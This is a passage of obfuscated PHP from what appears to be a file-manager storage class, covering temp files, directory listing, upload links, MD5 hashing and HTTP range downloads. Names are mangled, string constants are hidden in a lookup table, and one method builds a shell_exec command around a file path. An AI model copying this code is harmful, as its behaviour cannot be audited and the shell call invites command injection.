$bÆìŒ¿ÉÛ‰ = IO::listPath($AÒ°õµôµ®, !0); $C» ÆÚÛ‘ = array_merge($bÆìŒ¿ÉÛ‰[$B¨¡èØ³Í[74]], $bÆìŒ¿ÉÛ‰[$B¨¡èØ³Í[75]]); foreach ($C» ÆÚÛ‘ as $fáÓò÷À¼Ó) { IO::move($fáÓò÷À¼Ó[$B¨¡èØ³Í[76]], $D¶ÄïÒã†, REPEAT_RENAME_FOLDER); } IO::remove($AÒ°õµôµ®); } goto C¤ö¨ÕøÀ; C¤ö¨ÕøÀ: return $d–Şù²Ší ? $D¶ÄïÒã† : !1; goto aë§Ä”¿–‰; aë§Ä”¿–‰: } public function tempFile($bá–èëã… = '', $DÄÛÓ†»ƒ = '') { goto Fù¹Ô«ê°†; Fù¹Ô«ê°†: if (!$bá–èëã…) { $bá–èëã… = rand_string(15); } $eôø–‹Œ» = TEMP_FILES . rand_string(15) . $_SERVER[æ§›¦ÌáØ][8]; @mkdir($eôø–‹Œ», 511, !0); goto câ Í—İ½Û; câ Í—İ½Û: $Dô¦ÖË‹¤¥ = $eôø–‹Œ» . $bá–èëã…; @touch($Dô¦ÖË‹¤¥); if ($DÄÛÓ†»ƒ) { file_put_contents($Dô¦ÖË‹¤¥, $DÄÛÓ†»ƒ); } goto EŠ’óÇÀØŠ; EŠ’óÇÀØŠ: return $Dô¦ÖË‹¤¥; goto A‚À‹ïÖ®÷; A‚À‹ïÖ®÷: } public function tempFileRemve($cëÌïÔ¼…ó) { @unlink($cëÌïÔ¼…ó); @rmdir($this->pathFather($cëÌïÔ¼…ó)); } public function mkfile($aŸ•â¥ ‚Ğ, $EÑ–É¥ä¶ = '', $b’Œ¤è¾©— = REPEAT_RENAME) { } public function mkdir($AØ„£¥†±, $DŠ•¡£Äê = REPEAT_SKIP) { } public function delFile($càğßãá­) { } public function delFolder($bŒ÷¥¿ ) { } public function copyFile($BÄÉ¹ª²ËÓ, $A™—Ã……Ò…) { } public function moveFile($dÂ“ƒè‰², $F˜ß¬“ŒÙÒ) { } public function remove($f¿¸¹ºÏ”) { if ($this->isFile($f¿¸¹ºÏ”)) { return $this->delFile($f¿¸¹ºÏ”); } return $this->delFolder($f¿¸¹ºÏ”); } public function rename($EğßŞ‘œÓÒ, $d¤£ÂêÚ¢é) { } public function exist($CŞä¼Ş»—) { } public function findByHash($bÆèÉ‚Íë² = '', $DÕØĞê– = '') { return !1; } public function isFile($eš’¹ĞàóÍ) { } public function isFolder($cË§åÂÉ¾) { } public function size($bÎ‹Ò„éŞ) { } public function info($c»‚ŠóäÄÖ) { } public function infoSimple($EÌ½Õ³¶ò) { return $this->info($EÌ½Õ³¶ò); } public function infoAuth($cÂÍŞå”‚Ã) { return $this->info($cÂÍŞå”‚Ã); } public function infoFull($e½†½¡¤É‰) { return $this->info($e½†½¡¤É‰); } public function infoWithChildren($C…˜Ë•ø¢) { $fáÔò‹ÂÅ =& $_SERVER[æ§›¦ÌáØ]; static $aêÅîƒé = array(); if (isset($aêÅîƒé[$C…˜Ë•ø¢])) { return $aêÅîƒé[$C…˜Ë•ø¢]; } $a­Ê´¯æÃ = $this->info($C…˜Ë•ø¢); if ($a­Ê´¯æÃ && $a­Ê´¯æÃ[$fáÔò‹ÂÅ[29]] == $fáÔò‹ÂÅ[77]) { $c™İäÈ¦§ = array($fáÔò‹ÂÅ[78] => 0, $fáÔò‹ÂÅ[79] => 0, $fáÔò‹ÂÅ[80] => 0); $this->infoChildren($C…˜Ë•ø¢, $c™İäÈ¦§); $a­Ê´¯æÃ[$fáÔò‹ÂÅ[78]] = $c™İäÈ¦§[$fáÔò‹ÂÅ[78]]; $a­Ê´¯æÃ[$fáÔò‹ÂÅ[81]] = array($fáÔò‹ÂÅ[82] => $c™İäÈ¦§[$fáÔò‹ÂÅ[79]], $fáÔò‹ÂÅ[83] => $c™İäÈ¦§[$fáÔò‹ÂÅ[80]]); $aêÅîƒé[$C…˜Ë•ø¢] = $a­Ê´¯æÃ; } return $a­Ê´¯æÃ; } public function listPath($F«™ø§Ìæİ, $Fê¨îš•£ = false) { } public function has($cğõ¿Ô“Ü, $a÷ˆ·Ô‹»Ğ = false, $Bñ¸³ĞÄÎ¹ = false) { } public function canRead($Dª¹ºİ—„¹) { } public function canWrite($CŞù“¿á) { } public function getContent($B®ïë†”Ş») { } public function setContent($e¨øÅ›ÅËÊ, $AÇšæ¸ÏÒÔ = '') { } protected function infoChildren($eÎ¼Î¶†, &$C ª¯‹‰ô) { $eğ¦’‡¯˜” =& $_SERVER[æ§›¦ÌáØ]; check_abort_echo(); $AàÄäê¡‘£ = $this->listPath($eÎ¼Î¶†, !0); $AàÄäê¡‘£ = array_merge($AàÄäê¡‘£[$eğ¦’‡¯˜”[75]], $AàÄäê¡‘£[$eğ¦’‡¯˜”[74]]); foreach ($AàÄäê¡‘£ as $BÔ‚ˆŒò©) { if ($BÔ‚ˆŒò©[$eğ¦’‡¯˜”[29]] == $eğ¦’‡¯˜”[77]) { $C ª¯‹‰ô[$eğ¦’‡¯˜”[80]]++; $b‚‡¹ÅØ‚Û = $this->getPathInner($BÔ‚ˆŒò©[$eğ¦’‡¯˜”[76]]); $this->infoChildren($b‚‡¹ÅØ‚Û, $C ª¯‹‰ô); } else { $C ª¯‹‰ô[$eğ¦’‡¯˜”[79]]++; $C ª¯‹‰ô[$eğ¦’‡¯˜”[78]] += $BÔ‚ˆŒò©[$eğ¦’‡¯˜”[78]]; } } } public function fileSubstr($eÓöğòÙÅ, $a´Ä·’Ø³, $f†íí“¹øÁ) { } public function listAll($cŞóƒ–‰Ğ) { } public function listAllMake($E»ô–µÑ¸•, &$D­‹Œ„—ùÒ) { $aÔöå«¾¨Ş =& $_SERVER[æ§›¦ÌáØ]; check_abort_echo(); $fôÆ„¢†½ = $this->listPath($E»ô–µÑ¸•, !0); if (!$fôÆ„¢†½) { return; } $eäÌ¸¸ë = array_merge($fôÆ„¢†½[$aÔöå«¾¨Ş[75]], $fôÆ„¢†½[$aÔöå«¾¨Ş[74]]); foreach ($eäÌ¸¸ë as $E¨ğì×¶¼ø) { goto Eİ®°ÆÌ×; cê¾“è—áé: if (isset($E¨ğì×¶¼ø[$aÔöå«¾¨Ş[84]])) { $b†§ÓŒ³Ÿõ[$aÔöå«¾¨Ş[84]] = $E¨ğì×¶¼ø[$aÔöå«¾¨Ş[84]]; } if (!$Fù¡ª•í”­) { $D­‹Œ„—ùÒ[] = $b†§ÓŒ³Ÿõ; continue; } $D­‹Œ„—ùÒ[] = $b†§ÓŒ³Ÿõ; goto cÊéŠß…×Ê; cÊéŠß…×Ê: $this->listAllMake($E¨ğì×¶¼ø[$aÔöå«¾¨Ş[76]], $D­‹Œ„—ùÒ); goto F‰º½Şƒ©†; Eİ®°ÆÌ×: $Fù¡ª•í”­ = $E¨ğì×¶¼ø[$aÔöå«¾¨Ş[29]] == $aÔöå«¾¨Ş[77]; $b†§ÓŒ³Ÿõ = array($aÔöå«¾¨Ş[76] => $E¨ğì×¶¼ø[$aÔöå«¾¨Ş[76]], $aÔöå«¾¨Ş[77] => $Fù¡ª•í”­); if (isset($E¨ğì×¶¼ø[$aÔöå«¾¨Ş[78]])) { $b†§ÓŒ³Ÿõ[$aÔöå«¾¨Ş[78]] = $E¨ğì×¶¼ø[$aÔöå«¾¨Ş[78]]; } goto cê¾“è—áé; F‰º½Şƒ©†: } } public function listAllSimple($F¨–‰Ö‡‘ ) { $bä¨­¯ Ú‚ =& $_SERVER[æ§›¦ÌáØ]; $F—‹©ùì´Ä = array(); $Cà§ãÎŒ¶ = $this->listAll($F¨–‰Ö‡‘ ); $FèíÙ±×¡Ú = $this->getPathOuter($F¨–‰Ö‡‘ ); foreach ($Cà§ãÎŒ¶ as $CÕ˜Š„ïš°) { goto BŒğÔ°¡½¸; BŒğÔ°¡½¸: $f‘ôò…´Šå = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[76]]; $D÷óÄ¨ëÌ¾ = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[76]]; if (isset($CÕ˜Š„ïš°[$bä¨­¯ Ú‚[85]])) { $f‘ôò…´Šå = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[85]][$bä¨­¯ Ú‚[76]]; $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[78]] = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[85]][$bä¨­¯ Ú‚[78]]; $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[84]] = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[85]][$bä¨­¯ Ú‚[84]]; } else { $D÷óÄ¨ëÌ¾ = substr($CÕ˜Š„ïš°[$bä¨­¯ Ú‚[76]], strlen(get_path_father($FèíÙ±×¡Ú))); $D÷óÄ¨ëÌ¾ = $bä¨­¯ Ú‚[8] . ltrim($D÷óÄ¨ëÌ¾, $bä¨­¯ Ú‚[8]); } goto CéÁİä‰Ë; Aœ¬ƒ…Ùš×: if (!$CÕ˜Š„ïš°[$bä¨­¯ Ú‚[77]]) { $dì±¥¿§ˆ‰[$bä¨­¯ Ú‚[86]] = $f‘ôò…´Šå; } $F—‹©ùì´Ä[] = $dì±¥¿§ˆ‰; goto B×ä›—ÈãÊ; CéÁİä‰Ë: $dì±¥¿§ˆ‰ = array($bä¨­¯ Ú‚[76] => $D÷óÄ¨ëÌ¾, $bä¨­¯ Ú‚[77] => $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[77]]); if (isset($CÕ˜Š„ïš°[$bä¨­¯ Ú‚[78]]) && !$CÕ˜Š„ïš°[$bä¨­¯ Ú‚[77]]) { $dì±¥¿§ˆ‰[$bä¨­¯ Ú‚[78]] = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[78]]; } if (isset($CÕ˜Š„ïš°[$bä¨­¯ Ú‚[84]])) { $dì±¥¿§ˆ‰[$bä¨­¯ Ú‚[84]] = $CÕ˜Š„ïš°[$bä¨­¯ Ú‚[84]]; } goto Aœ¬ƒ…Ùš×; B×ä›—ÈãÊ: } return $F—‹©ùì´Ä; } public function upload($d»§Ë”¸›È, $a‚½‰åê, $F‹’™Ñá‰„ = false, $Fä×÷³í²Ş = REPEAT_REPLACE) { } public function uploadFileByID($EÊÁæ¢â¨È, $F»è¹ô±‰œ, $Eóã¿àµ£ß) { } public function uploadFileByPath($Eœƒë¸ó‘À, $fîÚçÊÉÒÆ, $D†¶Ë™Íº = array()) { } public function isUploadServer() { $BÌ³Úêï†í =& $_SERVER[æ§›¦ÌáØ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $BÌ³Úêï†í[87]) { return !0; } return $GLOBALS[$BÌ³Úêï†í[6]][$BÌ³Úêï†í[88]][$BÌ³Úêï†í[89]]; } public function isFileOutServer() { $A‘……›£†® =& $_SERVER[æ§›¦ÌáØ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $A‘……›£†®[87]) { return !0; } return $GLOBALS[$A‘……›£†®[6]][$A‘……›£†®[88]][$A‘……›£†®[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Fçš¦ÀÃ—) { $Eß¾àÁà =& $_SERVER[æ§›¦ÌáØ]; if (!$this->isCdnHost()) { return $Fçš¦ÀÃ—; } return str_replace(trim(get_url_root($Fçš¦ÀÃ—), $Eß¾àÁà[8]), trim($this->cdnHost, $Eß¾àÁà[8]), $Fçš¦ÀÃ—); } public function uploadLink($EšØè»‚âÇ, $F¥¬ªäÚº¤ = 0) { goto C¿—ƒ‰‰Øã; Eµ†¯±”Ğ¹: $C”¥ÜÁí£ = $F¥¬ªäÚº¤ <= $E”²Ú¶ÃÙÔ ? $a³‚§°­è[91] : $a³‚§°­è[92]; $F‡ê›œÉ¢ = (!$F¥¬ªäÚº¤ ? 1 : ceil($F¥¬ªäÚº¤ / pow(1024, 3))) * 3600 * 4; $aÉ¿ÖÌ“ = $this->{$C”¥ÜÁí£}($EšØè»‚âÇ, $F‡ê›œÉ¢); goto aŞäéœÓã; eƒÉÉÚÈ¢Š: if (!in_array($fİà‹’¼¨, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $E”²Ú¶ÃÙÔ = 1024 * 1024 * 10; goto Eµ†¯±”Ğ¹; aŞäéœÓã: if ($aÉ¿ÖÌ“) { $aÉ¿ÖÌ“[$a³‚§°­è[93]] = $EšØè»‚âÇ; $aÉ¿ÖÌ“[$a³‚§°­è[94]] = $fİà‹’¼¨; } return $aÉ¿ÖÌ“; goto FæîÀø‡Î; C¿—ƒ‰‰Øã: $a³‚§°­è =& $_SERVER[æ§›¦ÌáØ]; if ($this->isUploadServer()) { return; } $fİà‹’¼¨ = $this->getType(); goto eƒÉÉÚÈ¢Š; FæîÀø‡Î: } public function uploadFormData($Aï¾Ú†à¯Ğ, $b­ ù‘Ã©à = 3600) { } public function multiUploadFormData($a¾”µìŠÄ…, $f™À©¶¢™Û = 3600) { } public function download($bÓÔèå˜ƒÛ, $AÎ®ò°‡ Ÿ) { } public function ext($eººÒ¯ªé) { $fÏ‘œíœİ =& $_SERVER[æ§›¦ÌáØ]; if (strpos($eººÒ¯ªé, $fÏ‘œíœİ[8]) === -1) { $E‚Îç¥—±Ï = $eººÒ¯ªé; } else { $E‚Îç¥—±Ï = $this->pathThis($eººÒ¯ªé); } $BÄ¤ÄÒõ«œ = $fÏ‘œíœİ[33]; if (strstr($E‚Îç¥—±Ï, $fÏ‘œíœİ[95])) { $BÄ¤ÄÒõ«œ = substr($E‚Îç¥—±Ï, strrpos($E‚Îç¥—±Ï, $fÏ‘œíœİ[95]) + 1); $BÄ¤ÄÒõ«œ = strtolower($BÄ¤ÄÒõ«œ); } if (strlen($BÄ¤ÄÒõ«œ) > 3 && preg_match($fÏ‘œíœİ[96], $BÄ¤ÄÒõ«œ, $A‚¤Ó°ˆŸç)) { $BÄ¤ÄÒõ«œ = $fÏ‘œíœİ[33]; } return $BÄ¤ÄÒõ«œ; } public function pathThis($dãë™ÎáóĞ) { $DÈæÇŒÉ™¡ =& $_SERVER[æ§›¦ÌáØ]; $dãë™ÎáóĞ = str_replace($DÈæÇŒÉ™¡[97], $DÈæÇŒÉ™¡[8], rtrim($dãë™ÎáóĞ, $DÈæÇŒÉ™¡[8])); $d†Óöï•™ = strrpos($dãë™ÎáóĞ, $DÈæÇŒÉ™¡[8]); if ($d†Óöï•™ === !1) { return $dãë™ÎáóĞ; } return substr($dãë™ÎáóĞ, $d†Óöï•™ + 1); } public function pathFather($fî‹ÂìÆ²È) { $føÖÈÄ¥» =& $_SERVER[æ§›¦ÌáØ]; $fî‹ÂìÆ²È = str_replace($føÖÈÄ¥»[97], $føÖÈÄ¥»[8], rtrim($fî‹ÂìÆ²È, $føÖÈÄ¥»[8])); $Fòñ¬á×í = strrpos($fî‹ÂìÆ²È, $føÖÈÄ¥»[8]); if ($Fòñ¬á×í === !1) { return $føÖÈÄ¥»[33]; } return substr($fî‹ÂìÆ²È, 0, $Fòñ¬á×í + 1); } public function hashSimple($C˜‘®ÁíÌæ) { goto fÕ»ÌÕÍ™¥; cÁÉ÷‡øäÜ: $a‰¥éè¡• = 200; $f‹±òÅ“ŠŞ = 50; if ($aµÊ÷×í¢ <= $a‰¥éè¡• * $f‹±òÅ“ŠŞ) { return $this->hashMd5($C˜‘®ÁíÌæ) . $aµÊ÷×í¢; } goto Bâ©çô”›½; fÕ»ÌÕÍ™¥: $Fñ‘‹ïÚ‰µ =& $_SERVER[æ§›¦ÌáØ]; if (!$C˜‘®ÁíÌæ) { return md5($Fñ‘‹ïÚ‰µ[33]); } $aµÊ÷×í¢ = $this->size($C˜‘®ÁíÌæ); goto cÁÉ÷‡øäÜ; fˆçª†„ù›: $fòî¬Ôµ˜ .= $this->fileSubstr($C˜‘®ÁíÌæ, $aµÊ÷×í¢ - $a‰¥éè¡•, $a‰¥éè¡•); return md5($fòî¬Ôµ˜) . $aµÊ÷×í¢; goto BŠÂ‚Û•ƒô; Bâ©çô”›½: $d÷ô¼Ù´‚· = intval($aµÊ÷×í¢ / $f‹±òÅ“ŠŞ); $fòî¬Ôµ˜ = $Fñ‘‹ïÚ‰µ[33]; for ($e‘Æ¼˜‰‡¡ = 0; $e‘Æ¼˜‰‡¡ < $f‹±òÅ“ŠŞ; $e‘Æ¼˜‰‡¡++) { $fòî¬Ôµ˜ .= $this->fileSubstr($C˜‘®ÁíÌæ, $d÷ô¼Ù´‚· * $e‘Æ¼˜‰‡¡, $a‰¥éè¡•); } goto fˆçª†„ù›; BŠÂ‚Û•ƒô: } public static $md5Cache = array(); public function hashMd5($DË•ÏÏ±×š) { $DË•ÏÏ±×š = $this->iconvSystem($DË•ÏÏ±×š); if (isset(self::$md5Cache[$DË•ÏÏ±×š])) { return self::$md5Cache[$DË•ÏÏ±×š]; } self::$md5Cache[$DË•ÏÏ±×š] = $this->hashMd5Shell($DË•ÏÏ±×š); if (!self::$md5Cache[$DË•ÏÏ±×š]) { self::$md5Cache[$DË•ÏÏ±×š] = @md5_file($DË•ÏÏ±×š); } return self::$md5Cache[$DË•ÏÏ±×š]; } private function hashMd5Shell($f˜¾œã“ ˆ) { goto A±†µÉ‡‡; A±†µÉ‡‡: $e„ÃæÇ¡é =& $_SERVER[æ§›¦ÌáØ]; if (!function_exists($e„ÃæÇ¡é[98])) { return !1; } $eÆ¡Å©Öäá = array($e„ÃæÇ¡é[99], $e„ÃæÇ¡é[100]); goto E¸§ÆêÒ; E¸§ÆêÒ: $D¾¸¬İÁ§Ì = Cache::get($e„ÃæÇ¡é[101]); if (!$D¾¸¬İÁ§Ì) { $cìƒª·ì‚ = BASIC_PATH . $e„ÃæÇ¡é[102]; $f’Ä«Øëöˆ = md5_file($cìƒª·ì‚); $D¾¸¬İÁ§Ì = $e„ÃæÇ¡é[103]; foreach ($eÆ¡Å©Öäá as $aéĞ‚¼åŞ÷) { $d¢´¾°×é  = shell_exec($aéĞ‚¼åŞ÷ . "\40\42{$cìƒª·ì‚}\x22"); if ($d¢´¾°×é  && substr(trim($d¢´¾°×é ), 0, 32) == $f’Ä«Øëöˆ) { $D¾¸¬İÁ§Ì = $aéĞ‚¼åŞ÷; break; } } Cache::set($e„ÃæÇ¡é[101], $D¾¸¬İÁ§Ì, 3600); } if ($D¾¸¬İÁ§Ì == $e„ÃæÇ¡é[103]) { return !1; } goto b½ó’¢Ë¶; b½ó’¢Ë¶: $d¢´¾°×é  = shell_exec($D¾¸¬İÁ§Ì . "\40\42{$f˜¾œã“ ˆ}\42"); $d¢´¾°×é  = str_replace($e„ÃæÇ¡é[104], $e„ÃæÇ¡é[33], $d¢´¾°×é ); return substr($d¢´¾°×é , 0, 32); goto eŸ´‹éÑÕ; eŸ´‹éÑÕ: } public function link($Aïí²é…½¿) { return $Aïí²é…½¿; } public function fileOut($e¾¦Å»Å•Ï, $AÜ¥¢çŒ÷Á = false, $cëó°ëß£“ = false, $F·Ššğí = '') { goto CÜ’—¢öÙŞ; aã™¦Æ‚ª: if (isset($_SERVER[$cùÍ¢…ßÆù[131]]) && strtotime($_SERVER[$cùÍ¢…ßÆù[131]]) == $A»Ş•ó¼À[$cùÍ¢…ßÆù[84]]) { header($cùÍ¢…ßÆù[132], !0, 304); die; } if (isset($_SERVER[$cùÍ¢…ßÆù[133]]) && $_SERVER[$cùÍ¢…ßÆù[133]] == $F·Ššğí) { header($cùÍ¢…ßÆù[134] . $F·Ššğí, !0, 304); die; } header($cùÍ¢…ßÆù[134] . $F·Ššğí); goto A¾¡®ßÅ²—; c¹Õ¡ÇëĞù: @ob_end_clean(); set_timeout(); $A»Ş•ó¼À = $this->infoFull($e¾¦Å»Å•Ï); goto c«È¹™í“¸; c«È¹™í“¸: $d›Ë¢ÃÄƒÅ = $A»Ş•ó¼À[$cùÍ¢…ßÆù[78]]; $CÔçê¥ÉŸ¨ = gmdate($cùÍ¢…ßÆù[110], $A»Ş•ó¼À[$cùÍ¢…ßÆù[84]]); $eŒ¸’ª„ = $cëó°ëß£“ ? $cëó°ëß£“ : $this->iconvApp($A»Ş•ó¼À[$cùÍ¢…ßÆù[28]]); goto fùÄ³£ÉÓ; eš¤Ø®Ö˜: $dÜ§©Ã¨Ã· = get_file_mime($DÕ‰˜š¼“); if (strstr($dÜ§©Ã¨Ã·, $cùÍ¢…ßÆù[117])) { $dÜ§©Ã¨Ã· = $dÜ§©Ã¨Ã· . $cùÍ¢…ßÆù[118]; } if ($AÜ¥¢çŒ÷Á === !1 && !mime_support($dÜ§©Ã¨Ã·)) { $AÜ¥¢çŒ÷Á = !0; $dÜ§©Ã¨Ã· = $cùÍ¢…ßÆù[119]; } goto cøäµÙà”Û; CÜ’—¢öÙŞ: $cùÍ¢…ßÆù =& $_SERVER[æ§›¦ÌáØ]; $this->cacheMethod(null, null); if (!$e¾¦Å»Å•Ï || !$this->exist($e¾¦Å»Å•Ï)) { show_json(LNG($cùÍ¢…ßÆù[105]), !1, $cëó°ëß£“); } goto e­ğ§ğÚ¾¤; cøäµÙà”Û: header($cùÍ¢…ßÆù[120]); header($cùÍ¢…ßÆù[121] . $dÜ§©Ã¨Ã·); $C‘¶®Ë‰Âº = rawurlencode($eŒ¸’ª„); goto d¹™Ò‘­¢; fùÄ³£ÉÓ: $AèäÒ‡Ñ™— = 0; $B¨ò¼˜–ãÜ = $d›Ë¢ÃÄƒÅ - 1; $DÕ‰˜š¼“ = $this->ext($eŒ¸’ª„); goto f¼ª­ŞÉ´Ô; e­ğ§ğÚ¾¤: $b¥…àÌ×ëÀ = $this->getType() == $cùÍ¢…ßÆù[106]; $E«ÒÃ˜òèà = $GLOBALS[$cùÍ¢…ßÆù[6]][$cùÍ¢…ßÆù[88]][$cùÍ¢…ßÆù[107]][$cùÍ¢…ßÆù[108]]; $cĞ‚ÉŸ÷Ö¬ = (double) $GLOBALS[$cùÍ¢…ßÆù[6]][$cùÍ¢…ßÆù[88]][$cùÍ¢…ßÆù[107]][$cùÍ¢…ßÆù[109]] * 1024 * 1024; goto c¹Õ¡ÇëĞù; f‹‘ê³ŞÃ: header($cùÍ¢…ßÆù[128]); header($cùÍ¢…ßÆù[129]); header($cùÍ¢…ßÆù[130]); goto aã™¦Æ‚ª; d¹™Ò‘­¢: $C‘¶®Ë‰Âº = $cùÍ¢…ßÆù[116] . $C‘¶®Ë‰Âº . $cùÍ¢…ßÆù[122] . $C‘¶®Ë‰Âº; if ($AÜ¥¢çŒ÷Á) { header($cùÍ¢…ßÆù[123]); header($cùÍ¢…ßÆù[124] . $C‘¶®Ë‰Âº); } else { header($cùÍ¢…ßÆù[125] . $C‘¶®Ë‰Âº); } header($cùÍ¢…ßÆù[126] . gmdate($cùÍ¢…ßÆù[110], time() + 3600 * 24 * 30) . $cùÍ¢…ßÆù[127]); goto f‹‘ê³ŞÃ; CôóÈñºÜƒ: $FòÖÂ¨•˜È = !0; if ($_SERVER[$cùÍ¢…ßÆù[154]] == $cùÍ¢…ßÆù[155] && $d›Ë¢ÃÄƒÅ > 1204 * 1024 * 1024 * 2) { $FòÖÂ¨•˜È = !1; } if ($FòÖÂ¨•˜È) { header($cùÍ¢…ßÆù[156] . ($B¨ò¼˜–ãÜ - $AèäÒ‡Ñ™— + 1)); } goto e×ªò±¸ÀŒ; B®‰ùÓÊ»ï: header($cùÍ¢…ßÆù[138] . $d›Ë¢ÃÄƒÅ); header($cùÍ¢…ßÆù[139]); if (!$AÜ¥¢çŒ÷Á && $DÕ‰˜š¼“ == $cùÍ¢…ßÆù[140]) { if ($d›Ë¢ÃÄƒÅ > 1024 * 1024 * 5) { die; } $Dİ‰ö²éÊÏ = $this->getContent($e¾¦Å»Å•Ï); $Dİ‰ö²éÊÏ = Html::clearSVG($Dİ‰ö²éÊÏ); header($cùÍ¢…ßÆù[141] . strlen($Dİ‰ö²éÊÏ)); echo $Dİ‰ö²éÊÏ; die; } goto Eª£¶Ã¬‡å; Eª£¶Ã¬‡å: $e‚ç‰¼’š = strtolower($_SERVER[$cùÍ¢…ßÆù[142]]); if ($b¥…àÌ×ëÀ && $e‚ç‰¼’š && $E«ÒÃ˜òèà) { if (strstr($e‚ç‰¼’š, $cùÍ¢…ßÆù[143])) { header($cùÍ¢…ßÆù[144] . $e¾¦Å»Å•Ï); } else { if (strstr($e‚ç‰¼’š, $cùÍ¢…ßÆù[145])) { header($cùÍ¢…ßÆù[146] . $e¾¦Å»Å•Ï); } else { if (strstr($e‚ç‰¼’š, $cùÍ¢…ßÆù[147])) { header($cùÍ¢…ßÆù[148] . $e¾¦Å»Å•Ï); } } } if ($cĞ‚ÉŸ÷Ö¬) { header($cùÍ¢…ßÆù[149] . $cĞ‚ÉŸ÷Ö¬); } return; } if (isset($_SERVER[$cùÍ¢…ßÆù[150]])) { if (preg_match($cùÍ¢…ßÆù[151], $_SERVER[$cùÍ¢…ßÆù[150]], $C¬êÍƒ—è)) { $AèäÒ‡Ñ™— = intval($C¬êÍƒ—è[1]); if (!empty($C¬êÍƒ—è[2])) { $B¨ò¼˜–ãÜ = intval($C¬êÍƒ—è[2]); } } header($cùÍ¢…ßÆù[152]); header("\x43\157\x6e\164\145\156\x74\x2d\122\141\x6e\x67\145\72\x20\x62\171\x74\x65\163\40{$AèäÒ‡Ñ™—}\x2d{$B¨ò¼˜–ãÜ}\x2f" . $d›Ë¢ÃÄƒÅ); } else { header($cùÍ¢…ßÆù[153]); } goto CôóÈñºÜƒ; f¼ª­ŞÉ´Ô: if (in_array($DÕ‰˜š¼“, array($cùÍ¢…ßÆù[111], $cùÍ¢…ßÆù[112], $cùÍ¢…ßÆù[113], $cùÍ¢…ßÆù[114]))) { $DÕ‰˜š¼“ = $cùÍ¢…ßÆù[115]; } if (!$F·Ššğí) { $F·Ššğí = md5($CÔçê¥ÉŸ¨ . $this->hashSimple($e¾¦Å»Å•Ï)); } $F·Ššğí = $cùÍ¢…ßÆù[116] . $F·Ššğí . $cùÍ¢…ßÆù[116]; goto eš¤Ø®Ö˜; A¾¡®ßÅ²—: header($cùÍ¢…ßÆù[135] . $CÔçê¥ÉŸ¨ . $cùÍ¢…ßÆù[127]); header($cùÍ¢…ßÆù[136] . $eŒ¸’ª„); header($cùÍ¢…ßÆù[137]); goto B®‰ùÓÊ»ï; e×ªò±¸ÀŒ: if ($_SERVER[$cùÍ¢…ßÆù[157]] == $cùÍ¢…ßÆù[158]) { return; } $F¬šÈ•†Ğ = 1024 * 100; $B…­™î»†ß = 0; goto eŠšÄ¥åÈ; eŠšÄ¥åÈ: if ($cĞ‚ÉŸ÷Ö¬) { $B…­™î»†ß = intval(1000 * 1000 * ($F¬šÈ•†Ğ / $cĞ‚ÉŸ÷Ö¬)); } while ($AèäÒ‡Ñ™— <= $B¨ò¼˜–ãÜ) { $b¨ÆÄó«›Í = timeFloat(); check_abort(); $cÈÅ‹ßƒë‚ = $B¨ò¼˜–ãÜ - $AèäÒ‡Ñ™— + 1; if ($cÈÅ‹ßƒë‚ <= $F¬šÈ•†Ğ) { $F¬šÈ•†Ğ = $cÈÅ‹ßƒë‚; } echo $this->fileSubstr($e¾¦Å»Å•Ï, $AèäÒ‡Ñ™—, $F¬šÈ•†Ğ); $AèäÒ‡Ñ™— += $F¬šÈ•†Ğ; if ($F¬šÈ•†Ğ == $cÈÅ‹ßƒë‚) { $AèäÒ‡Ñ™— = $B¨ò¼˜–ãÜ + 1; } if ($B…­™î»†ß) { $fµ•—’ÇÀ = intval(1000 * 1000 * (timeFloat() - $b¨ÆÄó«›Í)); $E‡‹‰º¡óá = $B…­™î»†ß - $fµ•—’ÇÀ; if ($E‡‹‰º¡óá > 5) { usleep($E‡‹‰º¡óá); } } } goto DŠ¤É¼ƒØŞ; DŠ¤É¼ƒØŞ: } public function fileOutServer($d¼•ËŠÅÌ, $F©×êÖ¨´î = false, $fÓ©º¿‰ò = false, $fŒ×•¼ Ë = '') { $this->fileOut($d¼•ËŠÅÌ, $F©×êÖ¨´î, $fÓ©º¿‰ò, $fŒ×•¼ Ë); } public function fileOutLink($fè¢Š•ÚöÙ) { header($_SERVER[æ§›¦ÌáØ][159] . $fè¢Š•ÚöÙ); die; } public function cacheMethod($dÏ³Æ—áâ¬, $BÃ—ƒ™ßğ, $C¥¾Í®Šî = null) { goto eãõÛäõàè; bÅÃ£ïŞîô: $d‡ĞŞÂ½Œ = $B¬…ó«ˆáñ[160] . $dÏ³Æ—áâ¬ . $B¬…ó«ˆáñ[161] . rtrim($d÷äĞ‡»¹, $B¬…ó«ˆáñ[8]); if (is_null($dÏ³Æ—áâ¬)) { $D­‰¢Ëå„ = array(); return; } if (is_null($BÃ—ƒ™ßğ)) { unset($D­‰¢Ëå„[$d‡ĞŞÂ½Œ]); return; } goto bõ †É£Ê±; d«ä˜à¥†‰: $b–Îœè¤µŠ = $this->{$dÏ³Æ—áâ¬}($BÃ—ƒ™ßğ); $D­‰¢Ëå„[$d‡ĞŞÂ½Œ] = $b–Îœè¤µŠ; return $b–Îœè¤µŠ; goto cïôøìÕØ£; eãõÛäõàè: $B¬…ó«ˆáñ =& $_SERVER[æ§›¦ÌáØ]; static $D­‰¢Ëå„ = array(); $d÷äĞ‡»¹ = $BÃ—ƒ™ßğ ? ltrim($this->getPathOuter($BÃ—ƒ™ßğ), $B¬…ó«ˆáñ[8]) : $BÃ—ƒ™ßğ; goto bÅÃ£ïŞîô; bõ †É£Ê±: if (!is_null($C¥¾Í®Šî)) { $D­‰¢Ëå„[$d‡ĞŞÂ½Œ] = $C¥¾Í®Šî; return; } $b–Îœè¤µŠ = isset($D­‰¢Ëå„[$d‡ĞŞÂ½Œ]) ? $D­‰¢Ëå„[$d‡ĞŞÂ½Œ] : null; if 